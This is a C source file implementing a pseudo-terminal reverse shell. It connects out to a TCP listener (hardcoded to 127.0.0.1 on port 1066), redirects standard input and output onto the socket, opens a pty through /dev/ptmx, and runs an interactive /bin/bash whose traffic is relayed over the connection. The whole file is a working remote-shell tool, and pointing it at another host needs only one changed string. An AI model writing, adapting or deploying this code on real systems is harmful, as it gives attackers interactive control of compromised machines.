#define _GNU_SOURCE
#include <stdio.h>
#include <sys/un.h>
#include <stdlib.h>
#include <sys/poll.h>
#include <errno.h>
#include <string.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/fcntl.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

#define BUFSIZE 1024
static int master;
static int slave;
static int childPid;
int port = 1066;

int connectServer()
{
    int sk;
    int ret;
    struct sockaddr_in cli_addr={0};
    struct sockaddr_in svr_addr={0};

    sk = socket(AF_INET,SOCK_STREAM,0);
    /*
     *cli_addr.sin_family = AF_INET;
     *cli_addr.sin_port = htons(4040);
     *if(bind(sk,(struct sockaddr*)&cli_addr,sizeof(cli_addr))){
     *    perror("when bind");
     *    ret = -1;
     *    goto OUT;
     *}
     */

    svr_addr.sin_family = AF_INET;
    svr_addr.sin_port = htons(port);
    inet_aton("127.0.0.1",&svr_addr.sin_addr);
    printf("before connect\n");    
    if(connect(sk,(struct sockaddr*) &svr_addr,sizeof(svr_addr))){
        printf("connect error: %s,return\n",strerror(errno));    
        ret = -2;
        goto OUT;
    }

    close(0);
    close(1);
    close(2);
    dup(sk);
    dup(sk);
    dup(sk);

    ret = sk;
OUT:
    close(sk);
    return ret;
}

int openPtmx()
{
    int ret;
    char *slavePath;

    ret = open("/dev/ptmx",O_RDWR|O_NOCTTY);    //equal to getpt() man openpty
    if(ret == -1){
        perror("ptmx open error");
	return -1;
    }
    master = ret;

    ret = grantpt(master);
    if(ret != 0){
        perror("grantpt error!");
        goto CLOSE_MASTER;
    }
    ret = unlockpt(master);
    if(ret != 0){
        perror("unlockpt error!");
        goto CLOSE_MASTER;
    }

    slavePath = ptsname(master);    
    printf("new ptmx paire: %d,%s\n",master,slavePath);
    ret = open(slavePath,O_RDWR);
    if(ret == -1){
        perror("slave open error");
        goto CLOSE_MASTER;
    }
    slave = ret;
    return ret;

CLOSE_MASTER:
    close(master);
    return ret;
}

void confirmReady()
{
    int ret;
    char c;
    char buf[10]={0};
    do{
        printf("start recv (yes/no)[yes]:\n");
        #define READ_SIZE 4
        ret = read(STDIN_FILENO,buf,READ_SIZE);
        if(ret != -1){
            if(!strncmp("no",buf,2)){
                /*do nothing*/
            }else if(!strncmp("yes",buf,3)){
                break;
            }else if(!strncmp("\n",buf,1)){
                break;
            }
        }
        printf("ret %d\n",ret);
        if((ret == READ_SIZE) && (buf[READ_SIZE - 1] != '\n')){
            printf("flush\n");
            while ((c=getchar()) != '\n' && c != EOF);
        }
    } while(1);
}

void childExec()
{
    /*child 将pty的slave做为stdin/out/err.*/
    char * argv[] = {"/bin/bash","-i",NULL};
    printf("in child\n");
    close(0);
    close(1);
    close(2);
    close(master);

    dup2(slave,STDIN_FILENO);
    dup2(slave,STDOUT_FILENO);
    dup2(slave,STDERR_FILENO);
    close(slave);
    setsid();                                                                       
    ioctl(0,TIOCSCTTY,1);


    execv(argv[0],argv);
}

int fatherDataTunnel(int cpid)
{
    /*
     *father 进程负责实现sk及pty master的数据通讯 从一个读写入到另一个.
     */
    childPid = cpid;
    char buf[256];
    fd_set fd_in;
    int infd;
    int outfd;
    int ret;

    close(slave);
    while(1){
    AGAIN:
	FD_ZERO(&fd_in);
	FD_SET(STDIN_FILENO,&fd_in);        //0
	FD_SET(master,&fd_in);

	/*printf("select fd\n");*/
	ret = select(master+1,&fd_in,NULL,NULL,NULL);
	if(ret == -1){
	    perror("select error");
	    goto ERROR_1;
	}
	if(FD_ISSET(STDIN_FILENO,&fd_in)){
	    infd = STDIN_FILENO;
	    outfd = master;
	    /*dprintf(2,"read from stdin\n");*/
	}else if(FD_ISSET(master,&fd_in)){
	    infd = master;
	    outfd = STDOUT_FILENO;
	    /*dprintf(2,"read from ptx-master\n");*/
	}

	bzero(buf,sizeof(buf));
	ret = read(infd,buf,sizeof(buf));
	/*dprintf(2,"read in:%s\n",buf);*/
	if(ret < 0){
	    perror("read stdin error");
	    goto AGAIN;
	}else if(ret == 0){
	    break;
	}
	ret = write(outfd,buf,ret);     //send stdin to master.
	if(ret == 0){
	    perror("write out error");
	}
    }

    ret = 0;
ERROR_1:
    close(master);
    return ret;
}

int main(int argc,char **argv)
{
    int ret;
    int sk;

    ret = connectServer();
    if(ret < 0){
	goto ERROR_SK;
    }
    sk = ret;
    ret = openPtmx();
    if(ret < 0){
	goto ERROR_PTMX;
    }

    ret = fork();
    if(ret == 0){
	childExec();
    }else if(ret < 0){
	goto ERROR_PTMX;
    }else{
	fatherDataTunnel(ret);
	waitpid(childPid,&ret,0);
    }

    ret = 0;
ERROR_PTMX:
ERROR_SK:
    return ret;
}
